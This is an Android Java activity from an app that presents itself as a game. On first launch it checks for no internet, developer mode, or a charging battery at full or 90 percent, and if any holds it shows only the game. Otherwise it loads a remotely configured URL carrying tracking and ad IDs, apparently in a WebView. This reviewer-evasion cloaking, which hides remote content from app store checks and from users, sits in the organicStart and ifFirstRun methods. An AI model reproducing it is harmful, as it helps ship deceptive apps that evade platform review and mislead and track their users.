package com.kof.jetx;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;

import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.net.ConnectivityManager;
import android.net.Uri;
import android.os.BatteryManager;
import android.os.Bundle;
import android.webkit.ValueCallback;
import android.webkit.WebView;
import android.widget.ImageView;
import android.widget.ProgressBar;

import com.appsflyer.AppsFlyerConversionListener;
import com.appsflyer.AppsFlyerLib;
import com.bumptech.glide.Glide;
import com.facebook.FacebookSdk;
import com.google.android.gms.tasks.OnCompleteListener;
import com.google.android.gms.tasks.Task;
import com.google.firebase.remoteconfig.FirebaseRemoteConfig;
import com.google.firebase.remoteconfig.FirebaseRemoteConfigSettings;
import com.onesignal.OneSignal;

import org.json.JSONObject;

import java.util.Map;

public class GifPlayActivity extends AppCompatActivity implements SaveSettingsInterface, GifPlayInterface{

    SharedPreferences settings;
    String ref;
    String campaign;
    JSONObject jsonObject, h1;
    ImageView img;

    final static String ONE_SIGNAL = "d5fcb55e-9d5f-4121-bb62-3243b4d19da3";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_gif_play);
        img = (ImageView)findViewById(R.id.imageView3);
        initSp();
        loadGif(this);
        OneSignal.initWithContext(this);
        OneSignal.setAppId(ONE_SIGNAL);
        FacebookSdk.setAutoInitEnabled(true);
        FacebookSdk.fullyInitialize();
        if(!isFirstRun()){
            ifNotFirstRun();
        } else {
            ifFirstRun();
        }
    }

    @Override
    public void initSp() {
        settings = getSharedPreferences("Play Settings", MODE_PRIVATE);
    }

    @Override
    public String getDot() {
        return settings.getString("pref1", "");
    }

    @Override
    public void setDot(String dot) {
        settings.edit().putString("pref1", dot).apply();
    }

    @Override
    public String getWhatFirst() {
        return settings.getString("pref2", "game");
    }

    @Override
    public void setWhatFirst(String whatFirst) {
        settings.edit().putString("pref2", whatFirst).apply();
    }

    @Override
    public boolean isFirstRun() {
        return settings.getBoolean("pref3", true);
    }

    @Override
    public void setFirstRun(boolean firstRun) {
        settings.edit().putBoolean("pref3", firstRun).apply();
    }

    @Override
    public String getFirstFlyer() {
        return settings.getString("pref4", "first");
    }

    @Override
    public void setFirstFlyer(String sfflyer) {
        settings.edit().putString("pref4", sfflyer).apply();
    }

    @Override
    public boolean checkInternetAllow() {
        return ((ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE)).getActiveNetworkInfo() == null;
    }

    @Override
    public boolean checkBattary() {
        boolean charging = false;
        final Intent batteryIntent = registerReceiver(null, new IntentFilter(Intent.ACTION_BATTERY_CHANGED));
        int status = batteryIntent.getIntExtra(BatteryManager.EXTRA_STATUS, -1);
        boolean batteryCharge = status==BatteryManager.BATTERY_STATUS_CHARGING;
        int chargePlug = batteryIntent.getIntExtra(BatteryManager.EXTRA_PLUGGED, -1);
        boolean usbCharge = chargePlug == BatteryManager.BATTERY_PLUGGED_USB;
        boolean acCharge = chargePlug == BatteryManager.BATTERY_PLUGGED_AC;
        if (batteryCharge) charging=true;
        if (usbCharge) charging=true;
        if (acCharge) charging=true;
        return charging;
    }

    @Override
    public boolean checkDeveloperMode() {
        return android.provider.Settings.Secure.getInt(getApplicationContext().getContentResolver(),
                android.provider.Settings.Global.DEVELOPMENT_SETTINGS_ENABLED , 0) != 0;
    }

    @Override
    public void organicStart() {
        BatteryManager bm = (BatteryManager)getSystemService(BATTERY_SERVICE);
        int batLevel = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY);
        if (((batLevel == 100 || batLevel == 90) && checkBattary()) || checkDeveloperMode()) {
            setDot("");
            AppsFlyerLib.getInstance().unregisterConversionListener();
            startGame();
        } else {
            String workUrl = h1.optString("uyguguygug") + "?naming=null&apps_uuid=" + AppsFlyerLib.getInstance().getAppsFlyerUID(getApplicationContext()) + "&adv_id=null";
            setDot(workUrl);
            AppsFlyerLib.getInstance().unregisterConversionListener();
            startPlay();
        }
    }

    @Override
    public void nonOrganicStart() {
        campaign = jsonObject.optString("campaign");
        if (campaign.isEmpty() || campaign.equals("null")) { campaign = jsonObject.optString("c"); }
        String[] splitsCampaign = campaign.split("_");
        try{
            OneSignal.sendTag("user_id", splitsCampaign[2]);
        }catch (Exception e){}
        String workUrl = h1.optString("uyguguygug") + "?naming=" + campaign + "&apps_uuid=" + AppsFlyerLib.getInstance().getAppsFlyerUID(getApplicationContext()) + "&adv_id=" + jsonObject.optString("ad_id");
        setDot(workUrl);
        AppsFlyerLib.getInstance().unregisterConversionListener();
        startPlay();
    }

    @Override
    public void startGame() {
        startActivity(new Intent(GifPlayActivity.this, MainActivity.class));
        finish();
    }

    @Override
    public void startPlay() {
        startActivity(new Intent(GifPlayActivity.this, PlayShowActivity.class));
        finish();
    }

    @Override
    public void loadGif(Context context) {
        Glide.with(context).load(R.drawable.gif).into(img);
    }

    @Override
    public void ifNotFirstRun() {
        if (!getDot().isEmpty()) {
            startPlay();
        } else {
            startGame();
        }
    }

    @Override
    public void ifFirstRun() {
        if(checkInternetAllow()){
            startGame();
        } else {
            initAppsFlyer();
        }
    }

    @Override
    public void initAppsFlyer() {
        AppsFlyerLib.getInstance().init("pM8GDqCSNWSAoema7Evxtg", new AppsFlyerConversionListener() {
            @Override
            public void onConversionDataSuccess(Map<String, Object> conversionData) {
                if (getFirstFlyer() == "first") {
                    FirebaseRemoteConfig firebaseRemoteConfig = FirebaseRemoteConfig.getInstance();
                    FirebaseRemoteConfigSettings configSettings = new FirebaseRemoteConfigSettings.Builder()
                            .setMinimumFetchIntervalInSeconds(3600)
                            .build();
                    firebaseRemoteConfig.setConfigSettingsAsync(configSettings);
                    firebaseRemoteConfig.fetchAndActivate()
                            .addOnCompleteListener(GifPlayActivity.this, new OnCompleteListener<Boolean>() {
                                @Override
                                public void onComplete(@NonNull Task<Boolean> task) {
                                    try {
                                        ref = firebaseRemoteConfig.getValue("Fire").asString();
                                        h1 = new JSONObject(ref);
                                        jsonObject = new JSONObject(conversionData);
                                        if (jsonObject.optString("af_status").equals("Non-organic")) {
                                            nonOrganicStart();
                                        } else if (jsonObject.optString("af_status").equals("Organic")) {
                                            organicStart();
                                        } else {
                                            setDot("");
                                            AppsFlyerLib.getInstance().unregisterConversionListener();
                                            startGame();
                                        }
                                        setFirstRun(false);
                                        setFirstFlyer("second");
                                        AppsFlyerLib.getInstance().unregisterConversionListener();
                                    } catch (Exception ex) {
                                    }
                                }
                            });
                }
            }

            @Override
            public void onConversionDataFail(String errorMessage) {
            }

            @Override
            public void onAppOpenAttribution(Map<String, String> attributionData) {
            }

            @Override
            public void onAttributionFailure(String errorMessage) {
            }
        }, this);
        AppsFlyerLib.getInstance().start(this);
        AppsFlyerLib.getInstance().enableFacebookDeferredApplinks(true);
    }
}